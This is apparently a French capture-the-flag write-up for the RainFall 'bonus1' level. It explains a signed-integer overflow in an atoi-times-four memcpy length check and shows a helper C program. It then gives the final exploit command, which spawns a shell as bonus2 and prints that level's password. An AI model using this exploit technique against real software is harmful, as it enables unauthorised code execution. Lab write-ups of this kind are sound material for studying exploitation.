En etudiant le programme, on voit qu'il est vulnerable a cause d'une multiplication d'un entier signé par 4.  
En entree le programme verifie juste que la valeur rentree dans `atoi` est inferieur ou egal a 9.  
Et si c'est le cas, il va memcpy la valeur de `atoi` * 4 dans un buffer de 36 chars.

Ainsi si on trouve un moyen de passer une valeur negative, qui une fois multiplié par 4,  
donnera une valeur positive, on pourra overflow le buffer et ainsi set la variable  
qui est comparee avec `0x574f4c46` et executer ou non un shell.

J'ai pu trouver une valeur qui marche a la main via ce mini programme:
```c++
#include <stdio.h>

char in[64];

int main()
{
  scanf("%s",in);
  printf("CMP: %i | MEMCPY: %u\n", (int)atoi(in), (size_t)(atoi(in) * 4));
}

// STDIN  > -2147483637
// STDOUT > CMP: -2147483637 | MEMCPY: 44
```

Exploit final:
```bash
bonus1@RainFall:~$ ./bonus1 -2147483637 $(python -c 'print "B" * 40 + "\x46\x4c\x4f\x57"')
$ whoami
bonus2
$ cat /home/user/bonus2/.pass
579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
$
```